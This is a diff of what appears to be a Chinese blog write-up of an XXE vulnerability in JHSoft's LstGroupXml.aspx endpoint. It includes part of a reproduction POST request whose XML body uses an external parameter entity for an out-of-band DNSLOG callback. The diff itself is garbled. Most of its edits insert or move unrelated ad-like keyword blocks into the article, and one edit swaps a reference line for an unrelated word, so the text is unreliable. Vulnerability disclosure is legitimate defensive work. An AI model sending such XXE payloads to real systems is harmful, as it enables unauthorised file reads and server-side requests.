@@ -22,6 +22,14 @@ asset_dir: embedded-base64
 
 直接根据 `LstGroupXml.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Groups.dll` 将其进行反编译后找到 **LstGroupXml** 的处理逻辑
 
+深入探索
+
+企业资源规划
+
+企业技术
+
+VPN
+
 ```
 protected void Page_Load(object sender, EventArgs e)
 {
@@ -30,21 +38,13 @@ protected void Page_Load(object sender, EventArgs e)
   xmlDocument.LoadXml(end);
 ```
 
-深入探索
-
-数据管理
-
-脚本语言
-
-博客资源与服务
-
 请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
 # 漏洞复现
 
 > 另一个 JHSoft.Web.govsetaip/LstGroupXml.aspx 接口也存在同样的漏洞
 >
-> 参考信息
+> 操作系统
 
 ```
 POST /c6/Jhsoft.Web.groups/LstGroupXml.aspx/ HTTP/1.1
@@ -56,14 +56,6 @@ Host: jhsoft.mrxn.net
 %remote;]>
 <root/>
 ```
-
-深入探索
-
-字典与百科全书
-
-防病毒程序与恶意软件
-
-计算机科学
 
 在DNSLOG平台成功收到请求
 
